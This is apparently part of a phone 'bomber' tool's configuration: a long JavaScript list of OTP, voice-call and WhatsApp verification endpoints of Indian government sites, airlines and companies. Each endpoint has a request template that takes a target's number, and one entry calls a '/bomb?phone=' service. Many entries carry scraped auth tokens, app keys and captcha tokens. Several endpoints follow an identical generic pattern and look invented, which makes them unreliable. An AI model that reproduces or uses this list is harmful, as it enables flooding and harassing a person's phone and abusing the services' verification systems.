  { name: "CPGRAMS SMS", url: "https://pgportal.gov.in/api/v1/otp", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({mobile: p}) },
  { name: "CPGRAMS Call", url: "https://pgportal.gov.in/api/v1/voice-otp", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({phone: p}) },
  { name: "CPGRAMS WhatsApp", url: "https://pgportal.gov.in/gw/login-register/v1/sendOTP", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({mobileNumber: p}) },

  // ═══════════════════════════════════════════════════════════════
  // SECTION 236: GOVERNMENT - NATIONAL PORTAL
  // ═══════════════════════════════════════════════════════════════
  { name: "National Portal SMS", url: "https://www.india.gov.in/api/v1/otp", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({mobile: p}) },
  { name: "National Portal Call", url: "https://www.india.gov.in/api/v1/voice-otp", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({phone: p}) },
  { name: "National Portal WhatsApp", url: "https://india.gov.in/gw/login-register/v1/sendOTP", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({mobileNumber: p}) },

  // ═══════════════════════════════════════════════════════════════
  // SECTION 237: GOVERNMENT - RAIL CONNECT
  // ═══════════════════════════════════════════════════════════════
  { name: "Rail Connect SMS", url: "https://railconnect.indianrail.gov.in/api/v1/otp", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({mobile: p}) },
  { name: "Rail Connect Call", url: "https://railconnect.indianrail.gov.in/api/v1/voice-otp", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({phone: p}) },
  { name: "Rail Connect WhatsApp", url: "https://railconnect.indianrail.gov.in/gw/login-register/v1/sendOTP", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({mobileNumber: p}) },

  // ═══════════════════════════════════════════════════════════════
  // SECTION 238: AIRLINES - AIR INDIA
  // ═══════════════════════════════════════════════════════════════
  { name: "Air India SMS", url: "https://www.airindia.in/api/v1/otp", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({mobile: p}) },
  { name: "Air India Call", url: "https://www.airindia.in/api/v1/voice-otp", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({phone: p}) },
  { name: "Air India WhatsApp", url: "https://airindia.in/gw/login-register/v1/sendOTP", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({mobileNumber: p}) },

  // ═══════════════════════════════════════════════════════════════
  // SECTION 239: AIRLINES - INDIGO
  // ═══════════════════════════════════════════════════════════════
  { name: "IndiGo SMS", url: "https://www.goindigo.in/api/v1/otp", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({mobile: p}) },
  { name: "IndiGo Call", url: "https://www.goindigo.in/api/v1/voice-otp", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({phone: p}) },
  { name: "IndiGo WhatsApp", url: "https://goindigo.in/gw/login-register/v1/sendOTP", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({mobileNumber: p}) },

  // ═══════════════════════════════════════════════════════════════
  // SECTION 240: AIRLINES - SPICEJET
  // ═══════════════════════════════════════════════════════════════
  { name: "SpiceJet SMS", url: "https://www.spicejet.com/api/v1/otp", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({mobile: p}) },
  { name: "SpiceJet Call", url: "https://www.spicejet.com/api/v1/voice-otp", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({phone: p}) },
  { name: "SpiceJet WhatsApp", url: "https://spicejet.com/gw/login-register/v1/sendOTP", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({mobileNumber: p}) },

  // ═══════════════════════════════════════════════════════════════
  // SECTION 241: AIRLINES - AKASA AIR
  // ═══════════════════════════════════════════════════════════════
  { name: "Akasa Air SMS", url: "https://www.akasaair.com/api/v1/otp", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({mobile: p}) },
  { name: "Akasa Air Call", url: "https://www.akasaair.com/api/v1/voice-otp", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({phone: p}) },
  { name: "Akasa Air WhatsApp", url: "https://akasaair.com/gw/login-register/v1/sendOTP", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({mobileNumber: p}) },

  // ═══════════════════════════════════════════════════════════════
  // SECTION 242: AIRLINES - VISTARA
  // ═══════════════════════════════════════════════════════════════
  { name: "Vistara SMS", url: "https://www.airvistara.com/api/v1/otp", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({mobile: p}) },
  { name: "Vistara Call", url: "https://www.airvistara.com/api/v1/voice-otp", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({phone: p}) },
  { name: "Vistara WhatsApp", url: "https://airvistara.com/gw/login-register/v1/sendOTP", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({mobileNumber: p}) },

  // ═══════════════════════════════════════════════════════════════
  // SECTION 243: AIRLINES - GO FIRST
  // ═══════════════════════════════════════════════════════════════
  { name: "Go First SMS", url: "https://www.flygofirst.com/api/v1/otp", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({mobile: p}) },
  { name: "Go First Call", url: "https://www.flygofirst.com/api/v1/voice-otp", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({phone: p}) },
  { name: "Go First WhatsApp", url: "https://flygofirst.com/gw/login-register/v1/sendOTP", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({mobileNumber: p}) },

  // ═══════════════════════════════════════════════════════════════
  // SECTION 244: NEW APIS FROM apis1 - FULL LIST
  // ═══════════════════════════════════════════════════════════════
  { name: "DeHaat Full", url: "https://oidc.agrevolution.in/auth/realms/dehaat/custom/sendOTP", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({mobile_number: p, client_id: "kisan-app"}) },
  { name: "Breeze Full", url: "https://api.breeze.in/session/start", method: "POST", headers: {"Content-Type": "application/json", "x-device-id": "A1pKVEDhlv66KLtoYsml3", "x-session-id": "MUUdODRfiL8xmwzhEpjN8"}, data: (p) => JSON.stringify({phoneNumber: p, authVerificationType: "otp", device: {id: "A1pKVEDhlv66KLtoYsml3", platform: "Chrome", type: "Desktop"}, countryCode: "+91"}) },
  { name: "KPN Fresh AND", url: "https://api.kpnfresh.com/s/authn/api/v1/otp-generate?channel=AND&version=3.0.3", method: "POST", headers: {"x-app-id": "32178bdd-a25d-477e-b8d5-60df92bc2587", "x-app-version": "3.0.3", "x-user-journey-id": "7e4e8701-18c6-4ed7-b7f5-eb0a2ba2fbec", "Content-Type": "application/json; charset=UTF-8"}, data: (p) => JSON.stringify({phone_number: {country_code: "+91", number: p}}) },
  { name: "Udyog Plus", url: "https://udyogplus.adityabirlacapital.com/api/msme/Form/GenerateOTP", method: "POST", headers: {"Content-Type": "application/x-www-form-urlencoded; charset=UTF-8"}, data: (p) => `MobileNumber=${p}&functionality=signup` },
  { name: "Muthoot Full", url: "https://www.muthootfinance.com/smsapi.php", method: "POST", headers: {"Content-Type": "application/x-www-form-urlencoded; charset=UTF-8"}, data: (p) => `mobile=${p}&pin=XjtYYEdhP0haXjo3` },
  { name: "GoPaySense Full", url: "https://api.gopaysense.com/users/otp", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({phone: p}) },
  { name: "BankOpen Full", url: "https://v2-api.bankopen.co/users/register/otp", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({username: p, is_open_capital: 1}) },
  { name: "Tata Capital NLI Full", url: "https://retailonline.tatacapital.com/web/api/shaft/nli-otp/shaft-generate-otp/partner", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({header: {authToken: "MTI4OjoxMDAwMDo6ZDBmN2I4MGNiODIyNWY2MWMyNzMzN2I3YmM0MmY0NmQ6OjZlZTdjYTcwNDkyMmZlOTE5MGVlMTFlZDNlYzQ2ZDVhOjpkdmJuR2t5QW5qUmV2OHV5UDdnVnEyQXdtL21HcUlCMUx2NVVYeG5lb2M0PQ==", identifier: "nli"}, body: {mobileNumber: p}}) },
  { name: "TradeIndia App Full", url: "https://apis.tradeindia.com/app_login_api/login_app", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({mobile: `+91${p}`}) },
  { name: "Khatabook Full", url: "https://api.khatabook.com/v1/auth/request-otp", method: "POST", headers: {"x-kb-app-name": "khatabook", "x-kb-app-version": "801800", "x-kb-app-locale": "en", "x-kb-platform": "android", "Content-Type": "application/json; charset=UTF-8"}, data: (p) => JSON.stringify({phone: p, country_code: "+91", app_signature: "wk+avHrHZf2"}) },
  { name: "Orange Health Full", url: "https://accounts.orangehealth.in/api/v1/user/otp/generate/", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({mobile_number: p, customer_auto_fetch_message: true}) },
  { name: "JobHai Full", url: "https://api.jobhai.com/auth/jobseeker/v3/send_otp", method: "POST", headers: {"Content-Type": "application/json;charset=UTF-8", "device-id": "e97edd71-16a3-4835-8aab-c67cf5e21be1", "language": "en", "source": "WEB", "x-transaction-id": "JS-WEB-89b40679-56c2-4c0e-926e-0fafca8a84f3"}, data: (p) => JSON.stringify({phone: p}) },
  { name: "MConnect Full", url: "https://mconnect.isteer.co/mconnect/login", method: "POST", headers: {"app_platform": "mvaahna", "Content-Type": "application/json"}, data: (p) => JSON.stringify({mobile_number: `+91${p}`}) },
  { name: "AstroSage Full", url: "https://varta.astrosage.com/sdk/registerAS", method: "GET", headers: {}, data: null },
  { name: "Spinny Full", url: "https://api.spinny.com/api/c/user/otp-request/v3/", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({contact_number: p, whatsapp: false, code_len: 4}) },
  { name: "CityMall Full", url: "https://citymall.live/api/cl-user/auth/get-otp", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({phone_number: p}) },
  { name: "CodFirm Full", url: "https://api.codfirm.in/api/customers/login/otp", method: "GET", headers: {}, data: null },
  { name: "OYO Full", url: "https://www.oyorooms.com/api/pwa/generateotp?locale=en", method: "POST", headers: {"Content-Type": "text/plain;charset=UTF-8"}, data: (p) => JSON.stringify({phone: p, country_code: "+91", nod: 4}) },
  { name: "MyMA Full", url: "https://portal.myma.in/custom-api/auth/generateotp", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({countrycode: "+91", mobile: `91${p}`, is_otpgenerated: false, app_version: "-1"}) },
  { name: "Freedo Full", url: "https://api.freedo.rentals/customer/sendOtpForSignUp", method: "POST", headers: {"Content-Type": "application/json", "x-bn": "2.0.16", "x-channel": "WEB", "x-client-id": "FREEDO", "x-platform": "CUSTOMER"}, data: (p) => JSON.stringify({email_id: "cokiwav528@avastu.com", first_name: "Haiii", mobile_number: p}) },
  { name: "Cosmofeed Full", url: "https://prod.api.cosmofeed.com/api/user/authenticate", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({phoneNumber: p, countryCode: "+91", data: {email: "abcd2@gmail.com"}, authScreen: "signup-screen", userIsConvertingToCreator: false}) },
  { name: "Bisleri Full", url: "https://apis.bisleri.com/send-otp", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({email: "abfhhfhcd@gmail.com", mobile: p}) },
  { name: "EvitalRx Full", url: "https://www.evitalrx.in:4000/v3/login/signup_sendotp", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({pharmacy_name: "hfhfjfgfhkf", mobile: p, referral_code: "", email_id: "jhvd@gmail.com", zip_code: "110086"}) },
  { name: "QuickRide Full", url: "https://pwa.getquickride.com/rideMgmt/probableuser/create/new", method: "POST", headers: {"Content-Type": "application/x-www-form-urlencoded", "APP-TOKEN": "s16-q9fz-jy3p-rk"}, data: (p) => `contactNo=${p}&countryCode=%2B91&appName=Quick%20Ride` },
  { name: "Clovia Full", url: "https://www.clovia.com/api/v4/signup/check-existing-user/", method: "GET", headers: {}, data: null },
  { name: "KwikFix Full", url: "https://admin.kwikfixauto.in/api/auth/signupotp/", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({phone: p}) },
  { name: "Brevistay Full", url: "https://www.brevistay.com/cst/app-api/login", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({is_otp: 1, is_password: 0, mobile: p}) },
  { name: "Madras Mandi Full", url: "https://api.madrasmandi.in/api/v1/auth/otp", method: "POST", headers: {"Content-Type": "multipart/form-data; boundary=----WebKitFormBoundaryBBzDmO8qIRlvPMMZ"}, data: (p) => `------WebKitFormBoundaryBBzDmO8qIRlvPMMZ\r\nContent-Disposition: form-data; name="phone"\r\n\r\n+91${p}\r\n------WebKitFormBoundaryBBzDmO8qIRlvPMMZ--\r\n` },
  { name: "Bharat Loan Full", url: "https://www.bharatloan.com/login-sbm", method: "POST", headers: {"Content-Type": "application/x-www-form-urlencoded; charset=UTF-8"}, data: (p) => `mobile=${p}&current_page=login&is_existing_customer=2` },
  { name: "Pagarbook Full", url: "https://api.pagarbook.com/api/v5/auth/otp/request", method: "POST", headers: {"Content-Type": "application/json", "appversioncode": "5268", "clientbuildnumber": "5268", "clientplatform": "WEB", "userrole": "EMPLOYER"}, data: (p) => JSON.stringify({phone: p, language: 1}) },
  { name: "Vahak Full", url: "https://api.vahak.in/v1/u/o_w", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({phone_number: p, scope: 0, request_meta_data: "X0oLFl9sAAZzHuhTmaHk5Bbd+HFZDh+P9J6JhPghG2V1Ymi6OPEu0TH1vS2J2tc58KI/YpjG5tiqVlDkbBCMQCneV7fXtTsYRjhF8FfVNac=", is_whatsapp: false}) },
  { name: "Redcliffe Labs Full", url: "https://api.redcliffelabs.com/api/v1/notification/send_otp/?from=website&is_resend=false", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({phone_number: p, short: true}) },
  { name: "Ixigo Full", url: "https://www.ixigo.com/api/v5/oauth/dual/mobile/send-otp", method: "POST", headers: {"Content-Type": "application/x-www-form-urlencoded", "clientid": "ixiweb", "apikey": "ixiweb\u00212$"}, data: (p) => `sixDigitOTP=true&resendOnCall=false&prefix=%2B91&resendOnWhatsapp=false&phone=${p}` },
  { name: "55Club Full", url: "https://api.55clubapi.com/api/webapi/SmsVerifyCode", method: "POST", headers: {"Content-Type": "application/json;charset=UTF-8"}, data: (p) => JSON.stringify({phone: `91${p}`, codeType: 1, language: 0, random: "35ae48f136d74b279dbd0eeb2504e7f8", signature: "78A2879A0D46B65D257F9B29354B5DBA", timestamp: 1715445820}) },
  { name: "Zerodha Full", url: "https://zerodha.com/account/registration.php", method: "POST", headers: {"Content-Type": "application/json;charset=UTF-8"}, data: (p) => JSON.stringify({mobile: p, source: "zerodha", partner_id: ""}) },
  { name: "Aakash Full", url: "https://antheapi.aakash.ac.in/api/generate-lead-otp", method: "POST", headers: {"Content-Type": "application/json", "x-client-id": "a6fbf1d2-27c3-46e1-b149-0380e506b763"}, data: (p) => JSON.stringify({mobile_psid: p, mobile_number: "", activity_type: "aakash-myadmission"}) },
  { name: "Testbook Full", url: "https://api.testbook.com/api/v2/mobile/signup", method: "POST", headers: {"Content-Type": "application/json", "x-tb-client": "web,1.2"}, data: (p) => JSON.stringify({mobile: p, signupDetails: {page: "HomePage", pagePath: "/", pageType: "HomePage"}}) },
  { name: "MediBuddy Full", url: "https://loginprod.medibuddy.in/unified-login/user/register", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({source: "medibuddyInWeb", platform: "medibuddy", phonenumber: p, flow: "Retail-Login-Home-Flow", idealLoginFlow: false, advertiserId: "3893d117-b321-Lba9-815e-db63c64b112a", mbUserId: null}) },
  { name: "TradeIndia Registration Full", url: "https://api.tradeindia.com/home/registration/", method: "POST", headers: {"Content-Type": "multipart/form-data; boundary=----WebKitFormBoundarypzpW5AB7AKLEX4iX"}, data: (p) => `------WebKitFormBoundarypzpW5AB7AKLEX4iX\r\nContent-Disposition: form-data; name="country_code"\r\n\r\n+91\r\n------WebKitFormBoundarypzpW5AB7AKLEX4iX\r\nContent-Disposition: form-data; name="phone"\r\n\r\n${p}\r\n------WebKitFormBoundarypzpW5AB7AKLEX4iX--\r\n` },
  { name: "Beyoung Full", url: "https://www.beyoung.in/api/sendOtp.json", method: "POST", headers: {"Content-Type": "application/json;charset=UTF-8", "access-token": "JQ0fUq6r6dhzJHRLSdn3J6kyzNXumrEM9gy+q8456XEsQISIKfb31Wiyx/VhM84NYcBLGRVjXeU4GqYWDAJpwQ=="}, data: (p) => JSON.stringify({username: p, username_type: "mobile", service_type: 0, vid: "477701202435772"}) },
  { name: "Wrogn Full", url: "https://omqkhavcch.execute-api.ap-south-1.amazonaws.com/simplyotplogin/v5/otp", method: "POST", headers: {"Content-Type": "application/json", "action": "sendOTP", "shop_name": "wrogn-website.myshopify.com"}, data: (p) => JSON.stringify({username: `+91${p}`, type: "mobile", domain: "wrogn.com", recaptcha_token: ""}) },
  { name: "Medkart Full", url: "https://app.medkart.in/api/v1/auth/requestOTP?uuid=f9e75a95-e172-4922-b69c-08e1e3be9f1b", method: "POST", headers: {"Content-Type": "application/json", "app-platform": "web", "device_id": "6641194520998", "langcode": "en"}, data: (p) => JSON.stringify({mobile_no: p}) },
  { name: "MamaEarth Full", url: "https://auth.mamaearth.in/v1/auth/initiate-signup", method: "POST", headers: {"Content-Type": "application/json;charset=UTF-8", "isweb": "true"}, data: (p) => JSON.stringify({mobile: p, referralCode: ""}) },
  { name: "CoverFox Full", url: "https://www.coverfox.com/otp/send/", method: "POST", headers: {"Content-Type": "application/x-www-form-urlencoded"}, data: (p) => `csrfmiddlewaretoken=5YvA2IoBS6KRJrzV93ysh0VRRvT7CagG3DO7TPu5TwZ9161xVWsEsHzL6mYfvnIA&contact=${p}` },
  { name: "WoodenStreet Full", url: "https://www.woodenstreet.com/index.php?route=account/forgotten_popup", method: "POST", headers: {"Content-Type": "application/x-www-form-urlencoded; charset=UTF-8"}, data: (p) => `token=&firstname=Aartd&telephone=${p}&pincode=110086&city=NORTH+WEST+DELHI&state=DELHI&cxid=NTUxOTE0&email=hdftysdrt%40gmail.com&password=%40Abvdthfuj&pagesource=onload&redirect2=&login=2&userput_otp=` },
  { name: "GoMechanic Full", url: "https://gomechanic.app/api/v2/send_otp", method: "POST", headers: {"Content-Type": "application/json", "Authorization": "725ea1b774c3558a8ec01a8405334a6e50e1e822d9549d84b36a1d3bb9478a27"}, data: (p) => JSON.stringify({number: p, source: "website", random_id: "K6z9b"}) },
  { name: "MPaani Full", url: "https://homedeliverybackend.mpaani.com/auth/send-otp", method: "POST", headers: {"Content-Type": "application/json", "client-code": "vulpix"}, data: (p) => JSON.stringify({phone_number: p, role: "CUSTOMER"}) },
  { name: "TyrePlex Full", url: "https://www.tyreplex.com/includes/ajax/gfend.php", method: "POST", headers: {"Content-Type": "application/x-www-form-urlencoded; charset=UTF-8"}, data: (p) => `perform_action=sendOTP&mobile_no=${p}&action_type=order_login` },
  { name: "Licious Full", url: "https://www.licious.in/api/login/signup", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({phone: p, captcha_token: null}) },
  { name: "GoPaySense V2 Full", url: "https://api.gopaysense.com/users/otp", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({phone: p}) },
  { name: "Moglix Full", url: "https://apinew.moglix.com/nodeApi/v1/login/sendOTP", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({email: "", phone: p, type: "p", source: "signup", buildVersion: "DESKTOP-7.3", device: "desktop"}) },
  { name: "Oxygen Digital Shop Full", url: "https://oxygendigitalshop.com/graphql", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({operationName: "sendRegistrationOtp", variables: {email_or_otp: `+91${p}`, isResend: false, token: "03AFcWeA47pl14PFJtz3PaIyTLlRVG0gBdqirpf5kuLCM3Ue63bo30D5xtt3OngezeoBlB3kVH6x8AtyIRK-K6_WOXHx4W4bGNY4803bh8kpzibb2hUbjPTE780Kr1Gh7fVuZvTtsS-osUhhLAWsc3H8Fp3JFnFQi3u4gtZ_ARIQtzAUWp9p8Qt4nDsrM2fwtX9uC0SYz78n1EEXoIstjuEedvgPGsC7xqnwWBwySpW2tAGvVYIQzk6uloXuCUM9CLogsdYPt5_8G437Em9CO-I1SmQCyniCF0UDzfYGUl8pzIBSbWLzZdj4DvFkVHOHytFd6UvjqjTyuoT2RQI-KKXI9wJDGXwtbQOakjRLKE-SymDCD0k6GPQvjNJcbqhk-NMVckwSHLP3muLKQRI9EBKB4t3IjTCHoVyPMF0eLg4J5raYeukU0b0rwoOCoDs7_5uyLCc8qzIBh6LHywWirQJ-m1HvNyfsOvBX-d8_bWT7MIPKFflQfd_DnZKDyrFrRRMVQKiXeSVIRhEAZDIJul5f7Ns-t5isfYOU8-dcANSC1VJeMSPZBkXtKKvSXXYM9vtc7V59nhPyv7LU5v_wpZ2KwOHj7dybDeVr2ELZARDI1tc_NMxZy9HMrLuGhscKa1kSy29v0tpBqtU-l7vIB-1qLT-G3kxHJE4fdv9TL973FPzbEpz03wusN5YomS0hv31VhRPr-qDHBzmj-O1gyPxlEhPkNSPuiPwg"}, query: "mutation sendRegistrationOtp($token: String!, $email_or_otp: String!, $isResend: Boolean!) {\n  sendRegistrationOtp(token: $token, value: $email_or_otp, is_resend: $isResend)\n}\n"}) },
  { name: "UpGrad Full", url: "https://prod-auth-api.upgrad.com/apis/auth/v5/registration/phone", method: "POST", headers: {"Content-Type": "application/json", "client": "web", "course": "general-interest"}, data: (p) => JSON.stringify({phoneNumber: `+91${p}`}) },
  { name: "PinkNBlu Full", url: "http://www.pinknblu.com/v1/auth/generate/otp", method: "POST", headers: {"Content-Type": "application/x-www-form-urlencoded; charset=UTF-8"}, data: (p) => `_token=HvvCsMqCY6poDB4GYPd2DJxewZ6H6TWPMHt8hfEV&country_code=%2B91&phone=${p}` },
  { name: "Udaan Full", url: "https://auth.udaan.com/api/otp/send?client_id=udaan-v2", method: "POST", headers: {"Content-Type": "application/x-www-form-urlencoded;charset=UTF-8"}, data: (p) => `mobile=${p}` },
  { name: "Xylem PenPencil Full", url: "https://xylem-api.penpencil.co/v1/users/register/64254d66be2a390018e6d348", method: "POST", headers: {"Content-Type": "application/json", "client-version": "300", "client-id": "64254d66be2a390018e6d348", "client-type": "WEB"}, data: (p) => JSON.stringify({mobile: p, countryCode: "+91", firstName: "Anant Ambani"}) },
  { name: "NoBroker OTPM Full", url: "https://www.nobroker.in/api/v1/account/user/otp/send?otpM=true", method: "POST", headers: {"Content-Type": "application/x-www-form-urlencoded; charset=UTF-8"}, data: (p) => `phone=%2B91${p}` },
  { name: "TyrePlex V2 Full", url: "https://www.tyreplex.com/includes/ajax/gfend.php", method: "POST", headers: {"Content-Type": "application/x-www-form-urlencoded; charset=UTF-8"}, data: (p) => `perform_action=sendOTP&mobile_no=${p}&action_type=order_login` },
  { name: "Vidyakul Full", url: "https://vidyakul.com/signup-otp/send", method: "POST", headers: {"Content-Type": "application/x-www-form-urlencoded; charset=UTF-8"}, data: (p) => `phone=${p}` },
  { name: "WoodenStreet V2 Full", url: "https://api.woodenstreet.com/api/v1/register", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({firstname: "Astres", email: "abcdhbdgud77dd@gmail.com", telephone: p, password: "abcd@gmail.com#%fd", isGuest: 0, pincode: "110001", lastname: "", customer_id: ""}) },
  { name: "Bharat Loan V2 Full", url: "https://www.bharatloan.com/login-sbm", method: "POST", headers: {"Content-Type": "application/x-www-form-urlencoded; charset=UTF-8"}, data: (p) => `mobile=${p}&current_page=login&is_existing_customer=2` },

  // ═══════════════════════════════════════════════════════════════
  // SECTION 245: MORE NEW APIS - VOICE/VOICE CATEGORY
  // ═══════════════════════════════════════════════════════════════
  { name: "Swiggy Call Verification", url: "https://profile.swiggy.com/api/v3/app/request_call_verification", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({mobile: p}) },
  { name: "Tata Capital Voice", url: "https://mobapp.tatacapital.com/DLPDelegator/authentication/mobile/v0.1/sendOtpOnVoice", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({phone: p, isOtpViaCallAtLogin: "true"}) },
  { name: "1MG Voice Call", url: "https://www.1mg.com/auth_api/v6/create_token", method: "POST", headers: {"Content-Type": "application/json; charset=utf-8"}, data: (p) => JSON.stringify({number: p, otp_on_call: true}) },
  { name: "Myntra Voice Call", url: "https://www.myntra.com/gw/mobile-auth/voice-otp", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({mobile: p}) },
  { name: "Flipkart Voice Call", url: "https://www.flipkart.com/api/6/user/voice-otp/generate", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({mobile: p}) },
  { name: "Amazon Voice Call", url: "https://www.amazon.in/ap/signin", method: "POST", headers: {"Content-Type": "application/x-www-form-urlencoded"}, data: (p) => `phone=${p}&action=voice_otp` },
  { name: "Paytm Voice Call", url: "https://accounts.paytm.com/signin/voice-otp", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({phone: p}) },
  { name: "Zomato Voice Call", url: "https://www.zomato.com/php/o2_api_handler.php", method: "POST", headers: {"Content-Type": "application/x-www-form-urlencoded"}, data: (p) => `phone=${p}&type=voice` },
  { name: "MakeMyTrip Voice Call", url: "https://www.makemytrip.com/api/4/voice-otp/generate", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({phone: p}) },
  { name: "Goibibo Voice Call", url: "https://www.goibibo.com/user/voice-otp/generate/", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({phone: p}) },
  { name: "Ola Voice Call", url: "https://api.olacabs.com/v1/voice-otp", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({phone: p}) },
  { name: "Uber Voice Call", url: "https://auth.uber.com/v2/voice-otp", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({phone: p}) },

  // ═══════════════════════════════════════════════════════════════
  // SECTION 246: WHATSAPP CATEGORY
  // ═══════════════════════════════════════════════════════════════
  { name: "KPN WhatsApp", url: "https://api.kpnfresh.com/s/authn/api/v1/otp-generate?channel=AND&version=3.2.6", method: "POST", headers: {"x-app-id": "66ef3594-1e51-4e15-87c5-05fc8208a20f", "Content-Type": "application/json; charset=UTF-8"}, data: (p) => JSON.stringify({notification_channel: "WHATSAPP", phone_number: {country_code: "+91", number: p}}) },
  { name: "Foxy WhatsApp", url: "https://www.foxy.in/api/v2/users/send_otp", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({user: {phone_number: `+91${p}`}, via: "whatsapp"}) },
  { name: "Stratzy WhatsApp", url: "https://stratzy.in/api/web/whatsapp/sendOTP", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({phoneNo: p}) },
  { name: "Jockey WhatsApp", url: "https://www.jockey.in/apps/jotp/api/login/resend-otp/+91{phone}?whatsapp=true", method: "GET", headers: {}, data: null },
  { name: "Rappi WhatsApp", url: "https://services.mxgrability.rappi.com/api/rappi-authentication/login/whatsapp/create", method: "POST", headers: {"Content-Type": "application/json; charset=utf-8"}, data: (p) => JSON.stringify({country_code: "+91", phone: p}) },
  { name: "Eka Care WhatsApp", url: "https://auth.eka.care/auth/init", method: "POST", headers: {"Content-Type": "application/json; charset=UTF-8"}, data: (p) => JSON.stringify({payload: {allowWhatsapp: true, mobile: `+91${p}`}, type: "mobile"}) },

  // ═══════════════════════════════════════════════════════════════
  // SECTION 247: ORIGINAL SPLexxo + ADDITIONAL APIS
  // ═══════════════════════════════════════════════════════════════
  { name: "Splexxo Original", url: "https://splexxo1-2api.vercel.app/bomb?phone={phone}&key=SPLEXXO", method: "GET", headers: {}, data: null },

  // ═══════════════════════════════════════════════════════════════
  // SECTION 248: MORE APIS FROM apis1 & apis5
  // ═══════════════════════════════════════════════════════════════
  { name: "Aakash Full V2", url: "https://antheapi.aakash.ac.in/api/generate-lead-otp", method: "POST", headers: {"Content-Type": "application/json", "x-client-id": "a6fbf1d2-27c3-46e1-b149-0380e506b763"}, data: (p) => JSON.stringify({mobile_psid: p, mobile_number: "", activity_type: "aakash-myadmission", webengageData: {profile: "student", whatsapp_opt_in: true, method: "mobile"}}) },

  // ═══════════════════════════════════════════════════════════════
  // SECTION 249: ADDITIONAL APIS FROM apis3
  // ═══════════════════════════════════════════════════════════════
  { name: "BikeFixup Full", url: "https://api.bikefixup.com/api/v2/send-registration-otp", method: "POST", headers: {"Content-Type": "application/json; charset=UTF-8"}, data: (p) => JSON.stringify({phone: p, app_signature: "4pFtQJwcz6y"}) },
  { name: "Lenskart Full", url: "https://api-gateway.juno.lenskart.com/v3/customers/sendOtp", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({phoneCode: "+91", telephone: p}) },
  { name: "KPN Fresh AND Full", url: "https://api.kpnfresh.com/s/authn/api/v1/otp-generate?channel=AND&version=3.2.6", method: "POST", headers: {"x-app-id": "66ef3594-1e51-4e15-87c5-05fc8208a20f", "Content-Type": "application/json; charset=UTF-8"}, data: (p) => JSON.stringify({notification_channel: "WHATSAPP", phone_number: {country_code: "+91", number: p}}) },
